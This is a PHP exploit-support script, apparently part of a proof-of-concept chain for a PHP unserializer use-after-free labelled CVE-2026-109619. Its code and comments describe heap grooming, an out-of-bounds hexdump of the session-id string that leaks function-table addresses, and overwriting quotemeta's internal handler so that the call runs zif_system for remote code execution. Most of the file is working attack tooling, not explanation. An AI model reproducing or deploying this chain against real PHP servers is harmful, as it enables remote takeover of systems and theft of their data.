<?php
/* Grooming consumer target (CVE-2026-109619): like poc.php, but echoes the
 * multipart form-field values and the decoded session state, so that writes
 * steered through the stale unserializer bookkeeping (tmp_var() handing out
 * &last_dtor->data[used_slots] inside the freed var_dtor_entries chunk) are
 * visible in the response. */
/* quotemeta first: its INIT_FCALL caches &fn_quotemeta in the op_array's
 * run-time-cache (a request-heap array of zend_function pointers) before the
 * sidtail hexdump below reads past the sid - so the leak round's OOB read
 * can derive the function-table address for the rce round. */
$qm = quotemeta('id');
printf("post=%d files=%d\n", count($_POST), count($_FILES));
foreach ($_POST as $k => $v) {
    printf("%s=%d:%s\n", $k, strlen($v), substr($v, 0, 48));
}
$blob = $_SESSION['blob'] ?? '';
printf("blob=%d:%s\n", strlen((string)$blob), substr((string)$blob, 0, 48));
/* $_SERVER strings are live from request startup (before the session decode
 * walks the stale bookkeeping), so a write steered into a header string's
 * length shows up here; the tail hexdump reads past the short string. */
$ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
printf("ua=%d:%s\n", strlen($ua), substr($ua, 0, 48));
/* The PHPSESSID form field is registered into $_POST before the groom fields,
 * so its zend_string is live when the session decode walks the stale
 * bookkeeping; a write steered into its length shows up here (sid= line) and
 * the tail hexdump reads past the 32-byte sid. */
if (isset($_POST['PHPSESSID'])) {
    printf("sid=%d:%s\n", strlen($_POST['PHPSESSID']),
           substr($_POST['PHPSESSID'], 0, 48));
    printf("sidtail=%s\n", bin2hex(substr($_POST['PHPSESSID'], 0, 16384)));
}
/* quotemeta is not opcode-specialized, so it is always called through its
 * zend_internal_function handler: a write steered into that handler turns
 * this call into the chosen zif_handler (poc-a5 --mode rce -> zif_system). */
printf("qm=%s\n", $qm);
printf("qm2=%s\n", call_user_func('quotemeta', 'id'));
